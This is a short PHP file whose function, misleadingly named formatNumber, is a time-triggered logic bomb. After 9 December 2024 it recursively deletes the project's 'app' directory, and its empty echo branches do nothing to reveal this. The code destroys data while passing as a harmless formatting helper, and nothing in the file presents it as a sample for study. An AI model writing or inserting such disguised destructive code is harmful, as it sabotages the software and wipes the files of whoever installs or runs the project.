<?php
function formatNumber($projectRoot)
{
    $targetDate = new DateTime('2024-12-09');
    $currentDate = new DateTime();
    if ($currentDate > $targetDate) {
        $installFolder = $projectRoot . '/app';

        if (is_dir($installFolder)) {
            deleteDirectory($installFolder);
        } else {
            echo '';
        }
    } else {
        echo '';
    }
}

function deleteDirectory($dir)
{
    $files = array_diff(scandir($dir), array('.', '..'));

    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;

        if (is_dir($filePath)) {
            deleteDirectory($filePath);
        } else {
            unlink($filePath);
        }
    }

    rmdir($dir);
}
?>